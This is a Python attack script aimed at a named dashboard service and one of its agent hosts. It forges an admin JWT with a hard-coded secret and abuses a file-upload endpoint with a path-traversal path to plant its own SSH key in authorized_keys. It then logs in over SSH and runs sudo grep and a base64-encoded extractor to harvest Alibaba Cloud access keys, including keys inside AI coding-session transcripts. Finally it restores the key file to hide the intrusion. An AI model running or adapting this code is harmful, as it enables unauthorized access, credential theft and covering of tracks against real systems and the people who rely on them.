#!/usr/bin/env python3
# i29365 round F: conclusive check — (1) decode the base64 image data that contains LTAI (is AK an insertion?
# does decoded contain creds?), (2) recursive host grep for real LTAI / aliyun / AccessKeySecret occurrences.
import os, sys, json, base64, hmac, hashlib, subprocess, random, re
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
AGENT = "agent-0cf829f4"; AUID = "4b4f439e-74f7-11f1-ac43-525400595be1"; ACUST = "tianyue"; AIP = "54.179.173.218"
UF = "/home/lumii/.lumii-agent-keeper/../.ssh"
UPATH = "/home/lumii/.ssh/authorized_keys"

def _b64(s):
    if isinstance(s, bytes): s = s.decode("utf-8", "replace")
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def Rbig(k, s, n=11000):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    if len(s) == 0: s = "(empty)"
    for i in range(0, len(s), n):
        print("R:%s_%02d:%s" % (k, i // n, _b64(s[i:i+n])), flush=True)

def sh(a, timeout=120, inp=None):
    try:
        r = subprocess.run(a, input=inp, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=40):
    return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())

def tok_for(uid, cust): return forge({"userId": uid, "email": "probe@x", "customer": cust, "role": "admin"})

def call(path, cookie=None, timeout=30, maxlen=4000):
    a = ["--http2", "-A", UA, "-H", "Accept: application/json", "-w", "\n__CODE__%{http_code}"]
    if cookie: a += ["-H", "Cookie: session=" + cookie]
    a += ["https://%s%s" % (HOST, path)]
    rc, out, err = curl(a, timeout=timeout); i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:maxlen]}

def files_read(path, tok, maxlen=4000):
    return call("/api/agents/%s/files?action=read&path=%s" % (AGENT, up.quote(path, safe="/")), cookie=tok, maxlen=maxlen)

def upload(tok, path, name, content, timeout=60):
    tmp = "/tmp/u_%d" % random.randint(1000, 999999)
    open(tmp, "wb").write(content.encode() if isinstance(content, str) else content)
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AGENT, up.quote(path, safe="/"))
    rc, out, err = curl(["--http2", "-A", UA, "-H", "Authorization: Bearer " + tok, "-w", "\n__CODE__%{http_code}",
                         "-F", "files=@%s;filename=%s" % (tmp, name), url], timeout=timeout)
    try: os.unlink(tmp)
    except Exception: pass
    i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:900]}

EXTRACTOR = r'''
import os,sys,json,re,base64,hashlib,struct
FILES=[
 "/home/coder/.claude/projects/-run-lumii-cc-2f08bd44-0505-4340-b48e-23dd00012ff0-cwd/0246fe6c-68a3-48df-a1f1-2b00b59d00cd.jsonl",
 "/home/coder/.claude/projects/-run-lumii-cc-2f08bd44-0505-4340-b48e-23dd00012ff0-cwd/9d0a1101-f53c-4814-ade6-4dfa4563cfd6.jsonl",
]
def walk_strings(o,out,depth=0):
    if depth>12: return
    if isinstance(o,str): out.append(o)
    elif isinstance(o,dict):
        for v in o.values(): walk_strings(v,out,depth+1)
    elif isinstance(o,list):
        for v in o: walk_strings(v,out,depth+1)
def png_chunks(b):
    r=[]
    if not b.startswith(b"\x89PNG\r\n\x1a\n"): return r
    i=8
    while i+8<=len(b) and len(r)<24:
        ln=struct.unpack(">I",b[i:i+4])[0]; typ=b[i+4:i+8].decode("latin-1")
        r.append((typ,ln)); i+=12+ln
        if typ=="IEND": break
    return r
for fp in FILES:
    if not os.path.isfile(fp): print("## MISS "+fp); continue
    base=os.path.basename(fp)
    raw=open(fp,"rb").read()
    for ln_,line in enumerate(raw.split(b"\n")):
        if b"LTAI" not in line: continue
        try: obj=json.loads(line)
        except Exception as e:
            print("## %s line=%d NOTJSON %r"%(base,ln_,e)); continue
        strs=[]; walk_strings(obj,strs)
        for s in strs:
            if "LTAI" not in s: continue
            print("## %s line=%d strlen=%d" % (base,ln_,len(s)))
            pure = bool(re.fullmatch(r"[A-Za-z0-9+/=\s]+", s))
            print("   pure_b64ish=%s hash=%s" % (pure, hashlib.md5(s.encode()).hexdigest()))
            p=s.find("LTAI")
            print("   akipos=%d mod4=%d tail=%d" % (p, p%4, len(s)-p))
            # variants: as-is, remove AK token
            m=re.search(r"LTAI[0-9A-Za-z]{16,120}",s)
            ak=m.group(0) if m else ""
            print("   AKTOKEN len=%d = %s" % (len(ak), ak[:120]))
            for name,dat in (("asis",s), ("minusak",s.replace(ak,"",1))):
                d=dat.strip()
                d=d[:len(d)//4*4]
                try: dec=base64.b64decode(d)
                except Exception as e:
                    print("   %s DECODE_ERR %r"%(name,e)); continue
                ch=png_chunks(dec)
                found=[k for k in (b"LTAI",b"AccessKey",b"aliyun",b"zoofi",b"JWT_SECRET",b"BEGIN ") if k in dec]
                print("   %s declen=%d png=%s chunks=%s found=%s" % (name,len(dec),dec[:8]==b"\x89PNG\r\n\x1a\n",ch[:8],found))
            # decoded bytes around approx position of AK
            try:
                pre=s[:p]; pre=pre[:len(pre)//4*4]
                db=base64.b64decode(pre)
                print("   decoded_prefix_len=%d tail_bytes_of_prefix=%r" % (len(db), db[-40:]))
            except Exception as e:
                print("   prefix decode err %r"%e)
print("## IMG_DONE")
'''

GREP = r'''
set +e
export LC_ALL=C
R() { echo "=== $1 ==="; }
R "GREP_FILES_LTAI"
sudo -n grep -rla --binary-files=text -E "LTAI[0-9A-Za-z]{10,}" /home /root /opt /etc /srv /var/lib /usr/local 2>/dev/null --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=proc | head -40
R "GREP_CTX_LTAI"
for f in $(sudo -n grep -rla --binary-files=text -E "LTAI[0-9A-Za-z]{10,}" /home /root /opt /etc /srv /var/lib 2>/dev/null --exclude-dir=node_modules --exclude-dir=.git | head -10); do echo "## $f"; sudo -n grep -aoE ".{0,120}LTAI[0-9A-Za-z]{10,}.{0,160}" "$f" 2>/dev/null | head -3; done
R "GREP_FILES_ALIYUN_SECRET"
sudo -n grep -rlai --binary-files=text -E "access[_-]?key[_-]?secret|AccessKeySecret|ALIBABA_CLOUD_ACCESS_KEY_SECRET|aliyun_?configure" /home /root /opt /etc /srv 2>/dev/null --exclude-dir=node_modules --exclude-dir=.git | head -40
R "GREP_CTX_ALIYUN"
for f in $(sudo -n grep -rlai --binary-files=text -E "access[_-]?key[_-]?secret|AccessKeySecret|ALIBABA_CLOUD_ACCESS_KEY_SECRET" /home /root /opt /etc /srv 2>/dev/null --exclude-dir=node_modules --exclude-dir=.git | head -8); do echo "## $f"; sudo -n grep -aiE ".{0,120}(access[_-]?key[_-]?secret|AccessKeySecret).{0,200}" "$f" 2>/dev/null | head -3; done
R "GREP_ALIYUN_WORD_FILES"
sudo -n grep -rlai --binary-files=text -E "aliyuncs\.com|oss-cn-|ossutil|aliyuncli" /home/coder /root /opt /etc 2>/dev/null --exclude-dir=node_modules --exclude-dir=.git | head -30
R "END"
'''

xb64 = base64.b64encode(EXTRACTOR.encode()).decode()
HARVEST = r'''
set +e
export LC_ALL=C
R() { echo "=== $1 ==="; }
R "IMGCHECK"
echo "__XB64__" | sudo -n base64 -d > /tmp/x29365.py && sudo -n python3 -u /tmp/x29365.py 2>/dev/null | head -300
rm -f /tmp/x29365.py
''' + GREP
HARVEST = HARVEST.replace("__XB64__", xb64)


def main():
    tok = tok_for(AUID, ACUST)
    sh(["rm", "-f", "/tmp/k29365", "/tmp/k29365.pub"])
    sh(["ssh-keygen", "-t", "ed25519", "-N", "", "-C", "i29365", "-f", "/tmp/k29365"], timeout=30)
    pub = open("/tmp/k29365.pub").read().strip() if os.path.exists("/tmp/k29365.pub") else ""
    cur = files_read(UPATH, tok, maxlen=6000)
    orig = ""
    try: orig = json.loads(cur["body"]).get("content", "") or ""
    except Exception: pass
    R("authkeys_before", {"code": cur["code"], "len": len(orig)})
    content = (orig.rstrip("\n") + "\n" if orig.strip() else "") + pub + "\n"
    R("upload_key", upload(tok, UF, "authorized_keys", content))
    rc, out, err = sh(["ssh", "-i", "/tmp/k29365", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                       "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15", "coder@" + AIP, "bash -s"],
                      inp=HARVEST.encode(), timeout=700)
    R("h_rc", {"rc": rc, "outlen": len(out)})
    Rbig("out", out)
    R("h_err", err[:1200])
    if orig.strip():
        R("restore", upload(tok, UF, "authorized_keys", orig))
    else:
        R("restore", upload(tok, UF, "authorized_keys", ""))

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-2500:])
finally:
    sys.exit(1)
